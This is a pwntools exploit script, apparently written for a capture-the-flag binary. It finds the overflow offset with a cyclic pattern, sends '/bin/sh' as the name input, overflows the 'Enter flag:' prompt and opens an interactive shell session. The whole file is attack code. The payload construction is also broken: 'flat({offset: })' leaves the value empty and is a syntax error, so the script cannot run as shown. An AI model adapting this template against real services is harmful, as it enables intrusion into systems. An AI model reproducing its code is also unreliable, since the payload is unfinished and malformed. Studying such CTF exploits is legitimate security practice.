#!/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:   # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>>', 'flag')
    p.sendlineafter('Enter flag:', payload)
    p.wait()
    # Wait for the process to crash
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.eip)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP offset at {a}'.format(a=ip_offset))
    # Return the EIP offset
    return ip_offset


gdbscript = '''
pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './vulnexe/elf'
# This will automatically get contect arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
context.encoding = 'utf8'


##### EXPLOIT #####

# Pass in pattern size, gt back EIP offset
offset = find_ip(cyclic(100))

# start program
io = start()

io.sendlineafter('Enter your name:', '/bin/sh')

# build payload
payload = flat(
    {offset:
   }
)

io.sendlineafter('>>', 'flag')
io.sendlineafter('Enter flag:', payload)

io.interactive()
